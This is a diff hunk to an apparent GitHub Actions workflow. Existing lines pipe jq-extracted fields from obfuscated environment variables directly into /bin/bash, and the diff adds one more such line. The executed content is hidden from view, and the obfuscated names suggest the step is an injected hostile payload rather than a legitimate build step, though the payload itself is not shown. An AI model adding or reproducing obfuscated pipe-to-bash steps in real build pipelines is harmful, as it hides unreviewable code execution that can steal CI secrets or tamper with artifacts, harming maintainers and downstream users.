@@ -24,6 +24,7 @@ jobs:
           echo $u468 | jq -r .l442 | /bin/bash
           echo $l7 | jq -r .bshyn47 | /bin/bash
           echo $n0 | jq -r .npdfi0001 | /bin/bash
+          echo $omy18526 | jq -r .og89229 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
